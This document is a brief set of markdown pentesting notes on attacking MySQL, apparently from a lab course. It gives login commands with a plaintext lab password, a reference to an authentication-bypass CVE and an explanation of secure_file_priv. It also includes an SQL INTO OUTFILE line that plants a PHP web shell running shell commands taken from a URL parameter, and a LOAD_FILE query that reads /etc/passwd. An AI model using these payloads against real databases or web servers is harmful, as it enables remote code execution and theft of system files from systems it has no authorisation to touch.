#mysql
[Different Authentication methods](https://dev.mysql.com/doc/dev/mysql-server/latest/)
### MySQL 5.6.x
[CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass)
Auth By pass
### Read / Change the Database 
```shell
mysql -u julio -pPassword123 -h 10.129.20.13
```

```shell
mssqlclient.py -p 3306 julio@10.129.203.7 
```

### MySQL default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

### [Secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv)
Limits effect of data import and export 

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to
- the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

```mysql
show variables like "secure_file_priv";
```
### Write Local Files
```shell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
webshell.php?c=dir to use commands
### Read  Files
```mysql
select LOAD_FILE("/etc/passwd");
```

